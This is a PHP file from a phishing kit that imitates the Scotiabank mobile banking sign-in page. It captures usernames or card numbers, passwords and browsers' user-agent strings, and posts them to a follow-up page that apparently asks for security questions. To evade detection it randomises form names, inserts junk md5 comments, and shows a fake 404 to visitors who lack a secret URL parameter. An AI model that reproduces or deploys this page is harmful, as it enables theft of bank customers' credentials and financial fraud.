<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_GET["intcp"]))
{
	$fname=randomCha(rand(10,15));
	$error="";
	if(isset($_GET["errOccured"]))
	{
		$error="error";
	}
	
$ip=$_SERVER["REMOTE_ADDR"];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$hostname=gethostbyaddr($ip);
$agent=$_SERVER['HTTP_USER_AGENT'];

//EA2012

	echo '<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>

  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="advertisements/applei.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="advertisements/css.css?load_id='.randomCha(rand(15,16)).'">

  
  
</head>
<body class="">
<nav-bar params="route: route"><div>

';
if(isset($_GET["errOccured"]))
{
	echo '
<notifications><div class="notifications">
	<div class="error-message alert-box" tabindex="-1" style="">
		<span class="offscreen" alt="Notification"></span>
		<span class="notification-text">Either the card number/username or password is incorrect. Please try again. (LOGIN1001)</span>
	</div>
</div></notifications>
';
}
echo '



    <div class="nav-bar fixed" >
        <nav class="top-bar scotiabank" data-topbar="" role="navigation"  style="display: none;">
            <ul class="title-area">
                <li class="name">
                    <h1>


                    </h1>
                </li>

                
                <li class="toggle-topbar" ></li>
            </ul>
            
        <section class="middle tab-bar-section">
                        <img class="logo" aria-hidden="route().page === \'activate-select\' || route().page === \'recover-select\'  || route().page === \'dcv\' " tabindex="0" alt="Scotiabank"  src="advertisements/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section" ></section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" >
	<div class="alert-box" role="alertdialog"  tabindex="-1" style="display: none;">
		
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div  class="loading-container" id="loadingspin" role="alert" aria-live="assertive" tabindex="0" style="display: none;">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container" ><div  class="login-container component-container">
	<div>
		<img id="loginLogo" class="login-logo"  src="advertisements/login-logo.svg" onerror="images/en/login-logo.png" style="width: 60%;">
	</div>
	<div id="browser-warning-frame"></div>
	<form id="'.$fname.'" method="post"  autocomplete="off" novalidate="novalidate" action="nfaAuthntication.bs.php?intcp='.randomCha(rand(2,3)).'|QUESTIONS|F='.randomCha(rand(30,60)).'" name="'.$fname.'" onsubmit="document.getElementById(\'loadingspin\').style.display=\'\';">
		<div class="margin">
			<div class="clearfix">
				<label id="cardNumberInputLabel" class="login small dark-grey left" for="cardNumberInputText" >Username or Card Number</label>
				<label id="saveCheckLabel" class="small dark-grey right" for="saveCheck" >Remember me</label>
			</div>
			<input name="jID" value="'.randomCha(rand(10,99)).'" type="hidden" />
			<div class="input-1">
				<div>
					
					<input id="cardNumberInputText" name="uname" type="text" class="login-card-number small '.$error.'" autocomplete="off">
					
					
				</div>
				<div class="save-card">
					<input id="saveCheck" type="checkbox" class="save-card" name="saveCheck" >
					<label tabindex="0" id="saveCheckLabelStar" class="save-card" for="saveCheck"></label>
				</div>
			</div>
			<label id="passwordInputLabel" class="small dark-grey" for="passwordInputText" >Password</label>
			<div>
				<input id="passwordInputText" type="password" name="pword" class="password '.$error.'" autocomplete="off">
			</div>
		</div>
		<div class="row login" id="signin">
			<div class="large-12 columns">
				<button type="submit" id="signOnButton" class="red-button mb20" >Sign In</button>
			</div>
			<div class="large-12 columns c">
				<a href="#" id="resetPasswordURL" class="clickable input-action small blue" >Need help signing in?</a>
			</div>
		</div>
		<input name="browser_foot" value="'.base64_encode($agent).'" type="hidden" />
	</form>
	<div class="block-icons">
		<ul class="small-block-grid-1" >
			<li alt="$parent.i18n.t(actionDescription)">
				<a href="#"  class="clickable naviLinks login-footer-links extra-small black menu-locator">Locator</a>
			</li>
		
			<li alt="$parent.i18n.t(actionDescription)">
				<a href="#"  class="clickable naviLinks login-footer-links extra-small black menu-contact">Contact Us</a>
			</li>
		
			<li alt="$parent.i18n.t(actionDescription)">
				<a href="#"  class="clickable naviLinks login-footer-links extra-small black menu-security-privacy">Mobile Banking Security and Privacy</a>
			</li>
		
			<li alt="$parent.i18n.t(actionDescription)">
				<a href="#"  class="clickable naviLinks login-footer-links extra-small black menu-verify">Activate Mobile Banking</a>
			</li>
		</ul>
	</div>
	
	<div id="welcomeBetaModal" class="reveal-modal" data-reveal="" role="dialog" aria-labelledby="title-text" tabindex="-1">
		<h2 id="modalTitle title-text"><span id="welcomeTitle"  tabindex="0">Welcome to our new mobile website!</span></h2>
		<p class="lead body-text"><span >Our new mobile website was designed with one person in mind: you. Here you\'ll find many of the features you\'re already using, but we\'ve made them clearer, easier to find, and simpler to use.

If you\'re not ready to try out the Beta version, you can still bank through any of the following:
</span></p>
		<ul class="modalList" data-tab="">
			<li class="modalBullet"><a href="#" >Classic Scotiabank Mobile Website</a></li>
			<li class="modalBullet"><a href="#" >iOS/Android apps</a></li>
			<li class="modalBullet"><a href="#" >Scotia OnLine</a></li>
		</ul>
		<button id="search"  class="red-button mt20"><span >Sign In</span></button>
		<button id="closeWelcomeModal" class="close-reveal-modal welcome-modal" title="" aria-label="Close Alert"><span aria-hidden="true">×</span></button>
	</div>
	<div id="language" class="radio-toolbar">
		<input type="radio" id="radio1" class="show-for-sr" name="radios" value="en" aria-label="English" checked="checked" ><button for="radio1" >EN</button><input type="radio" id="radio2" name="radios" class="show-for-sr" value="fr" aria-label="Francais"  lang="fr"><button for="radio2" >FR</button>
	</div>
</div>
</div>

<script>
var count = 0;

function spinit(){
  var bar = document.getElementsByClassName("spinner")[0].children;
  bar[count].firstChild.style.background = "black";
  count += 1; count = count % bar.length;
  bar[count].firstChild.style.background = "white";
  bar[count].firstChild.style.border = "2px solid black";
}
setInterval(spinit, 100);
</script>

';
if(rand(1,3) == 2)
{
	echo "<!-- sID generation = ";
	for($i=0;$i<10;$i++)
	{
		echo md5(rand(1,100));
	}
	echo "-->";
}
echo '

</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>